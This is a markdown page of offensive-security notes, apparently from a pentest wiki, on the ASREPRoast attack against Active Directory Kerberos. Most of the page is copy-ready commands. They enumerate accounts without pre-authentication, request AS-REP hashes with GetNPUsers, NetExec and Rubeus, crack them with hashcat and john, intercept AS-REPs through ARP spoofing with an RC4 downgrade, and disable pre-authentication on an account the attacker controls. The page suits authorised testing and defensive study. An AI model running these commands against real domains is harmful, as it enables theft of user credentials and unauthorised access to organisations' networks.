---
title: ASREPRoast Attack
tags:
  - active-directory
---
ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
- **Connection to the Domain Controller (DC)**: Attackers need access to the DC to send requests and receive encrypted messages.
- **Optional domain account**: Having a domain account allows attackers to more efficiently identify vulnerable users through LDAP queries. Without such an account, attackers must guess usernames.

### Enumerating vulnerable users (need domain credentials)


=== "Linux"

	```bash
	bloodyAD.py -u user -p 'Password123$!' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName  
	```

=== "PowerView"

	```powershell
	Get-DomainUser -PreauthNotRequired -verbose
	```


### Request AS_REP message

=== "Linux"
	
	```bash title="Linux"
	# Users list dynamically queried with an LDAP anonymous bind.
	GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/' 
	
	# With a users file.
	GetNPUsers.py -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'
	
	# Users list dynamically queried with a LDAP authenticated bind (password).
	GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'
	
	# Users list dynamically queried with a LDAP authenticated bind (NT hash).
	GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'
	```
	
	This can also be achieved with [NetExec](https://github.com/Pennyw0rth/NetExec) (Python).
	
	```bash
	nxc ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter
	```
	
	The [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit is a good alternative to the tools mentioned above.

=== "Windows"
	
	The same thing can be done with [Rubeus](https://github.com/GhostPack/Rubeus) from a session running with a domain user privileges.
	
	```powershell
	Rubeus.exe asreproast  /format:hashcat /outfile:ASREProastables.txt
	```

Depending on the output format used (`hashcat` or `john`), [hashcat](https://github.com/hashcat/hashcat) and [JohnTheRipper](https://github.com/magnumripper/JohnTheRipper) can be used to try [cracking the hashes](https://www.thehacker.recipes/a-d/movement/credentials/cracking).

```bash
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
```

```bash
john --wordlist=$wordlist ASREProastables.txt
```

### ASREProast MitM

Another way to conduct AS-REP roasting, without relying on Kerberos pre-authentication being disabled, would be to have a man-in-the-middle position on the network and catch AS-REPs. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).

```bash
# Proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disables ARP spoofing (the MitM must be obtained with other means)
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passively listen for AS-REP packets, no packet alteration
ASRepCatcher listen
```

### Make User ASREPRoastable

Force **preauth** not required for a user where you have **GenericAll** permissions (or permissions to write properties):

=== "Linux"

	```bash
	bloodyAD.py -u user -p 'Password123$!' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
	```

=== "Windows"
	
	```powershell
	Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
	```

**References:**

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
- https://www.thehacker.recipes/a-d/movement/kerberos/asreproast